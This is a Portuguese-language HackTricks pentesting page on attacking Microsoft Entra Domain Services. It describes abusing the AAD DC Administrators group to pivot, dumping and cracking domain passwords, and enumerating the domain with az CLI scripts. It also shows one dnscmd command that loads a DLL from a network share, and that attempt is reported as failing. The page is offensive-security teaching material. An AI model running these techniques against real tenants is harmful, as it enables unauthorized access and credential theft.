# Az - Microsoft Entra Domain Services

{{#include ../../../banners/hacktricks-training.md}}

## Serviços de Domínio

Microsoft Entra Domain Services permite implantar um Active Directory no Azure sem precisar gerenciar Domain Controllers (na verdade você nem sequer tem acesso a eles).

Seu objetivo principal é permitir executar aplicações legadas na cloud que não conseguem usar métodos de autenticação modernos, ou quando você não quer que consultas de diretório sempre retornem para um ambiente on-premises AD DS.

Note que, para sincronizar os usuários gerados no Entra ID (e não sincronizados a partir de outros Active Directories) para o serviço de domínio AD, você precisa **alterar a senha do usuário** para uma nova para que ele possa ser sincronizado com o novo AD. Na verdade, o usuário não é sincronizado do Microsoft Entra ID para Domain Services até que a senha seja alterada.

> [!WARNING]
> Mesmo se você estiver criando um novo domínio Active Directory, você não será capaz de gerenciá-lo completamente (a menos que explore algumas más configurações), o que significa que por padrão, por exemplo, você não pode criar usuários diretamente no AD. Você os cria **sincronizando usuários do Entra ID.** Você pode indicar sincronizar todos os usuários (mesmo aqueles sincronizados de outros ADs on-premises), apenas usuários cloud (usuários criados no Entra ID), ou até mesmo **filtrá-los mais.**

> [!NOTE]
> Em geral, devido à falta de flexibilidade na configuração do novo domínio e ao fato de que ADs geralmente já estão on-premises, esta não é a principal integração entre Entra ID e AD, mas ainda é interessante saber como comprometê-lo.

### Pivoting

Membros do grupo gerado **`AAD DC Administrators`** recebem permissões de administrador local em VMs que estão domain-joined ao domínio gerenciado (mas não nos domain controllers), porque eles são adicionados ao grupo de administradores locais. Membros desse grupo também podem usar **Remote Desktop para se conectar remotamente a VMs domain-joined**, e também são membros dos grupos:

- **`Denied RODC Password Replication Group`**: Este é um grupo que especifica usuários e grupos cujas senhas não podem ser armazenadas em cache em RODCs (Read-Only Domain Controllers).
- **`Group Policy Creators Owners`**: Este grupo permite que membros criem Group Policies no domínio. No entanto, seus membros não podem aplicar group policies a usuários ou grupos nem editar GPOs existentes, então não é tão interessante nesse ambiente.
- **`DnsAdmins`**: Este grupo permite gerenciar as configurações de DNS e foi abusado no passado para [escalate privileges and compromise the domain](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=dnsadmin#dnsadmins), entretanto, após testar o ataque neste ambiente, verificou-se que a vulnerabilidade está corrigida:
```text
dnscmd TDW52Y80ZE26M1K.azure.hacktricks-training.com /config /serverlevelplugindll \\10.1.0.6\c$\Windows\Temp\adduser.dll

DNS Server failed to reset registry property.
Status = 5 (0x00000005)
Command failed:  ERROR_ACCESS_DENIED     5    0x5
```
Note que, para conceder essas permissões, dentro do AD o grupo **`AAD DC Administrators`** é tornado membro dos grupos anteriores, e também a GPO **`AADDC Computers GPO`** adiciona como Local Administrators todos os membros do grupo de domínio **`AAD DC Administrators`**.

Fazer pivot de Entra ID para um AD criado com Domain Services é simples: basta adicionar um usuário ao grupo **`AAD DC Administrators`**, acessar via RDP qualquer/todas as máquinas do domínio e você poderá roubar dados e também **comprometer o domínio.**

No entanto, fazer pivot do domínio para o Entra ID não é tão fácil, pois nada do domínio é sincronizado para o Entra ID. Ainda assim, sempre verifique os metadados de todas as VMs ingressas no domínio, pois as managed identities atribuídas podem ter permissões interessantes. Além disso, **dump all the users passwords from the domain** e tente cracká‑las para então fazer login no Entra ID / Azure.

> [!NOTE]
> Note que no passado outras vulnerabilidades neste managed AD foram encontradas que permitiram comprometer os DCs, [como esta](https://www.secureworks.com/research/azure-active-directory-domain-services-escalation-of-privilege?utm_source=chatgpt.com). Um atacante que comprometesse o DC poderia muito facilmente manter persistência sem os admins do Azure perceberem ou mesmo conseguirem removê‑la.

### Enumeração
```bash
# Get configured domain services domains (you can add more subs to check in more subscriptions)
az rest --method post \
--url "https://management.azure.com/providers/Microsoft.ResourceGraph/resources?api-version=2021-03-01" \
--body '{
"subscriptions": [
"0ce1297c-9153-425d-3229-f51093614377"
],
"query": "resources | where type == \"microsoft.aad/domainservices\"",
"options": {
"$top": 16,
"$skip": 0,
"$skipToken": ""
}
}'

# Get domain configuration
az rest --url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/entra-domain-services/providers/Microsoft.AAD/DomainServices/<domain-name>?api-version=2022-12-01&healthdata=true"
## e.g.
az rest --url "https://management.azure.com/subscriptions/0ce1297c-9153-425d-3229-f51093614377/resourceGroups/entra-domain-services/providers/Microsoft.AAD/DomainServices/azure.hacktricks-training.com?api-version=2022-12-01&healthdata=true"

# Based on the VNet assigned to the domain services, you can enumerate the VMs in the domain

subscription_id="0ce1297c-9153-425d-3229-f51093614377"
vnet_name="aadds-vnet"

# Retrieve all VMs in the subscription
vm_list=$(az vm list --subscription "$subscription_id" --query "[].{Name:name, ResourceGroup:resourceGroup}" --output tsv)

# Iterate through each VM to check their VNet connection
echo "VMs connected to VNet '$vnet_name':"
while IFS=$'\t' read -r vm_name resource_group; do
nic_ids=$(az vm show --subscription "$subscription_id" --name "$vm_name" --resource-group "$resource_group" --query "networkProfile.networkInterfaces[].id" --output tsv)

for nic_id in $nic_ids; do
subnet_id=$(az network nic show --ids "$nic_id" --query "ipConfigurations[0].subnet.id" --output tsv)

if [[ $subnet_id == *"virtualNetworks/$vnet_name"* ]]; then
echo "VM Name: $vm_name, Resource Group: $resource_group"
fi
done
done <<< "$vm_list"
```
{{#include ../../../banners/hacktricks-training.md}}
